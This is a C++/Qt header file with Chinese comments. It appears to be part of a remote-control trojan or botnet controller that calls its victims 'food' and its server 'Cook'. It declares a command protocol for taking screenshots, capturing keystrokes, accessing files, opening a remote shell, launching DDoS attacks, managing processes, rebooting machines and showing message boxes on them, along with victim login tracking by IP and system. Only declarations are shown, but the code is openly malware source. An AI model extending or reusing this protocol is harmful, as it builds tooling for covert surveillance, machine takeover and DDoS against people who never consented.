// 封装了食物这个对象以及与食物的互动
// 包括对于命令的解析和定义

#ifndef FOOD_H
#define FOOD_H

#include <QObject>
#include <QObject>
#include "tcpsocket.h"
#include <QTimer>
#include <QTcpSocket>
#include <QHostAddress>
#include <QTextCodec>

class Food : public QObject
{
    Q_OBJECT
public:
    explicit Food(QTcpSocket *sock, QObject *parent = nullptr);

    //-------------------------------------------------------------------------------
    // 服务端向客户端发送的指令
    const QByteArray CmdSnapshoot = "CMD_SNAPSHOOT";
    const QByteArray CmdKeybd = "CMD_KEYBD";
    const QByteArray CmdFile = "CMD_FILE";
    const QByteArray CmdShell = "CMD_SHELL";
    const QByteArray CmdDdos = "CMD_DDOS";
    const QByteArray CmdProcess = "CMD_PROC";

    const QByteArray CmdSendBox = "SENDBOX";
    const QByteArray CmdReboot = "REBOOT";
    const QByteArray CmdOffline = "OFFLINE";

    // 客户端向服务端发送的指令(你觉得有需要你也可以增加自己的指令)
    const QByteArray CmdLogin = "LOGIN";
    //------------------------------------------------------------------------------

    // 分割符号和结束符号
    const QByteArray CmdSplit = ";";
    const QByteArray CmdEnd = "\r\n";

    // 断开食物
    void closeAndDelete();

    // 设置ID
    void setId(int id) {
        mId = id;
    }

    // 发送命令
    void sendCmdSendBox(QString &text);
    void sendCmdReboot();
    void sendCmdOffline();
    void sendCmdSnapshoot(int port);
    void sendCmdKeybd(int port);
    void sendCmdFile(int port);
    void sendCmdShell(int port);
    void sendCmdDdos(int port);

private:
    TcpSocket *mSock;       // 与食物通讯的socket 注意 这里用的是我们设计的TcpSocket类
    QTimer *mLoginTimeout;  // 用来判断客户是否超时登入
    int mId;                // 初始值是-1, 登入后会由Cook分配大于或等于0的ID号码

    // 用来转换编码
    QTextCodec *codec = QTextCodec::codecForName("GBK");

    // 处理食物发送过来的指令
    // @cmd: 指令
    // @args: 参数
    void processCommand(QByteArray &cmd, QByteArray &args);

    // 分解指令的参数，反回哈希表
    QHash<QByteArray, QByteArray> parseArgs(QByteArray &args);

    // 各个指令相应的函数
    void doLogin(QHash<QByteArray, QByteArray> &args);

signals:
    // 登入和登出信号
    // @food: 自己
    void login(Food *food, QString userName, QString ip, int port, QString system);
    void logout(int id);

public slots:
    // 如果客户在制定时间内还没有登入就踢了他
    void foodLoginTimeout();

    // 客户断开
    void disconnected();

    // 接收新数据
    void newData();
};

#endif // FOOD_H
